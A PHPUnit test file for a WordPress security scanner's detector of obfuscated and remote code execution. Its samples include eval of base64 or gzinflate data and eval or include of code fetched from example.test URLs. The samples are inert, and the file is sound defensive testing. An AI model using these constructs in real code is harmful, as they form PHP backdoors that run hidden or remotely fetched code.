<?php

declare(strict_types=1);

namespace WP_Doctor\Tests\Check\Category\Security;

use PHPUnit\Framework\TestCase;
use WP_Doctor\Check\Category\Security\Code_Sinks;
use WP_Doctor\Util\Php_Tokens;

/**
 * The samples are inert: the encoded payloads decode to the comment
 * "// inert test marker", and every URL is under example.test.
 */
final class Code_Sinks_Test extends TestCase {

	private const MARKER     = 'Ly8gaW5lcnQgdGVzdCBtYXJrZXI=';
	private const DEFLATED   = '09dXyMxLLSpRKEktLlHITSzKTi0CAA==';
	private const HIDDEN_URL = 'aHR0cDovL2V4YW1wbGUudGVzdC9wYXlsb2FkLnR4dA==';

	/**
	 * Hits in a source file.
	 *
	 * @param string $code PHP statements, without the opening tag.
	 * @return array<int, array{sink: string, line: int, traits: string[], functions: string[]}>
	 */
	private function hits( string $code ): array {
		return Code_Sinks::in( Php_Tokens::significant( "<?php\n" . $code ) );
	}

	/**
	 * A long base64-looking string, as packed payloads are.
	 *
	 * @return string
	 */
	private static function long_encoded(): string {
		return str_repeat( 'TG9yZW0gaXBzdW0g', 20 );
	}

	/**
	 * @return array<string, array{0: string, 1: string, 2: string}>
	 */
	public function decoded_samples(): array {
		$marker   = self::MARKER;
		$deflated = self::DEFLATED;
		$long     = self::long_encoded();

		return array(
			'eval of base64'               => array( "eval( base64_decode( '$marker' ) );", 'eval', Code_Sinks::DECODED ),
			'nested decoders'              => array( "eval( gzinflate( base64_decode( '$deflated' ) ) );", 'eval', Code_Sinks::DECODED ),
			'silenced and upper case'      => array( "@EVAL( Str_Rot13( 'Ly8gdmmyeag' ) );", 'eval', Code_Sinks::DECODED ),
			'fully qualified decoder'      => array( "eval( \\base64_decode( '$marker' ) );", 'eval', Code_Sinks::DECODED ),
			'through a variable'           => array( "\$p = base64_decode( '$marker' );\neval( \$p );", 'eval', Code_Sinks::DECODED ),
			'through two variables'        => array( "\$a = base64_decode( '$marker' );\n\$b = \$a;\neval( '?>' . \$b );", 'eval', Code_Sinks::DECODED ),
			'through a string transform'   => array( "\$a = base64_decode( '$marker' );\neval( trim( \$a ) );", 'eval', Code_Sinks::DECODED ),
			'decoded inside a custom call' => array( "eval( my_unpack( base64_decode( '$marker' ) ) );", 'eval', Code_Sinks::DECODED ),
			'assert of base64'             => array( "assert( base64_decode( '$marker' ) );", 'assert', Code_Sinks::DECODED ),
			'create_function body'         => array( "\$f = create_function( '', base64_decode( '$marker' ) );", 'create_function', Code_Sinks::DECODED ),
			'long encoded literal'         => array( "eval( my_unpack( '$long' ) );", 'eval', Code_Sinks::ENCODED ),
			'long literal in a variable'   => array( "\$x = '$long';\neval( str_replace( 'x', '', \$x ) );", 'eval', Code_Sinks::ENCODED ),
			'hex escapes'                  => array( 'eval( "' . str_repeat( '\\x2f', 60 ) . '" );', 'eval', Code_Sinks::ENCODED ),
		);
	}

	/**
	 * @dataProvider decoded_samples
	 * @param string $code  PHP statements.
	 * @param string $sink  Construct expected to run the code.
	 * @param string $expected Trait expected on the hit.
	 */
	public function test_code_run_from_decoded_or_encoded_data_is_found( string $code, string $sink, string $expected ): void {
		$hits = $this->hits( $code );

		$this->assertCount( 1, $hits, $code );
		$this->assertSame( $sink, $hits[0]['sink'] );
		$this->assertContains( $expected, $hits[0]['traits'] );
	}

	/**
	 * @return array<string, array{0: string, 1: string}>
	 */
	public function remote_samples(): array {
		$hidden = self::HIDDEN_URL;

		return array(
			'eval of a fetched URL'     => array( "eval( file_get_contents( 'https://example.test/payload.txt' ) );", 'eval' ),
			'URL in a variable'         => array( "\$u = 'http://example.test/p.txt';\n\$c = file_get_contents( \$u );\neval( '?>' . \$c );", 'eval' ),
			'decoded URL'               => array( "eval( file_get_contents( base64_decode( '$hidden' ) ) );", 'eval' ),
			'curl result'               => array( "\$ch = curl_init( \$u );\n\$body = curl_exec( \$ch );\neval( \$body );", 'eval' ),
			'WordPress HTTP API'        => array( "\$r = wp_remote_get( 'https://example.test/x' );\neval( wp_remote_retrieve_body( \$r ) );", 'eval' ),
			'include of a URL'          => array( "include 'http://example.test/shell.txt';", 'include' ),
			'require_once of a URL'     => array( "require_once( 'https://example.test/x.php' );", 'require_once' ),
			'include of a download'     => array( 'include download_url( $url );', 'include' ),
			'assert of a socket stream' => array( "\$s = fsockopen( 'example.test', 80 );\nassert( fread( \$s, 4096 ) );", 'assert' ),
		);
	}

	/**
	 * @dataProvider remote_samples
	 * @param string $code PHP statements.
	 * @param string $sink Construct expected to run the code.
	 */
	public function test_code_run_from_another_server_is_found( string $code, string $sink ): void {
		$hits = $this->hits( $code );

		$this->assertCount( 1, $hits, $code );
		$this->assertSame( $sink, $hits[0]['sink'] );
		$this->assertContains( Code_Sinks::REMOTE, $hits[0]['traits'] );
	}

	/**
	 * @return array<string, array{0: string}>
	 */
	public function harmless_samples(): array {
		$marker = self::MARKER;

		return array(
			'eval in a comment'              => array( "// eval( base64_decode( '$marker' ) );\n/* eval( gzinflate( \$x ) ) */" ),
			'eval in a string'               => array( "\$doc = \"eval( base64_decode( '$marker' ) )\";" ),
			'decoding without running'       => array( "\$data = json_decode( base64_decode( \$_COOKIE['prefs'] ), true );" ),
			'assert method'                  => array( "\$this->assert( base64_decode( '$marker' ) );\nself::assert( base64_decode( '$marker' ) );" ),
			'function named like a sink'     => array( 'function assert( $v ) { return base64_decode( $v ); }' ),
			'assert of a type check'         => array( "\$info = base64_decode( '$marker' );\nassert( is_string( \$info ) && '' !== \$info );" ),
			'metadata of a connection'       => array( "\$fp = curl_init( 'https://example.test' );\n\$info = curl_getinfo( \$fp );\nassert( is_array( \$info ) );" ),
			'eval of a local template'       => array( "eval( '?>' . file_get_contents( __DIR__ . '/template.php' ) );" ),
			'include of a local file'        => array( "include __DIR__ . '/inc/functions.php';\nrequire_once ABSPATH . 'wp-admin/includes/file.php';" ),
			'fetched content echoed'         => array( "\$b = wp_remote_retrieve_body( wp_remote_get( 'https://example.test' ) );\necho esc_html( \$b );" ),
			'short base64 in eval'           => array( "eval( '$marker' );" ),
			'long plain text in eval'        => array( "eval( '" . str_repeat( 'return the value of this setting ', 10 ) . "' );" ),
			'variable function with decoder' => array( "\$cb = 'strtoupper';\n\$x = \$cb( base64_decode( '$marker' ) );" ),
		);
	}

	/**
	 * @dataProvider harmless_samples
	 * @param string $code PHP statements.
	 */
	public function test_ordinary_code_is_not_reported( string $code ): void {
		$this->assertSame( array(), $this->hits( $code ), $code );
	}

	public function test_each_provider_has_samples(): void {
		$this->assertGreaterThan( 10, count( $this->decoded_samples() ) );
		$this->assertGreaterThan( 5, count( $this->remote_samples() ) );
		$this->assertGreaterThan( 10, count( $this->harmless_samples() ) );
	}

	public function test_a_hit_gives_the_line_of_the_construct_and_the_functions_involved(): void {
		$hits = $this->hits( "\$a = 1;\n\n@eval( gzinflate( base64_decode( '" . self::DEFLATED . "' ) ) );" );

		$this->assertSame( 4, $hits[0]['line'] );
		$this->assertSame( array( 'gzinflate', 'base64_decode' ), $hits[0]['functions'] );
		$this->assertSame( 'eval() of gzinflate(), base64_decode()', Code_Sinks::describe( $hits[0] ) );
	}

	public function test_an_include_of_a_url_is_described_as_such(): void {
		$hits = $this->hits( "include 'http://example.test/x.txt';" );

		$this->assertSame( 'include of a URL', Code_Sinks::describe( $hits[0] ) );
	}

	public function test_a_long_encoded_string_is_described_as_such(): void {
		$hits = $this->hits( "eval( my_unpack( '" . self::long_encoded() . "' ) );" );

		$this->assertSame( 'eval() of a long encoded string', Code_Sinks::describe( $hits[0] ) );
	}

	public function test_line_numbers_count_lines_inside_comments_and_strings(): void {
		$hits = $this->hits( "/*\n\n*/\n\$s = 'a\nb';\neval( base64_decode( '" . self::MARKER . "' ) );" );

		$this->assertSame( 7, $hits[0]['line'] );
	}

	public function test_an_unclosed_call_at_the_end_of_a_file_is_still_read(): void {
		$hits = $this->hits( "eval( base64_decode( '" . self::MARKER . "'" );

		$this->assertCount( 1, $hits );
	}
}
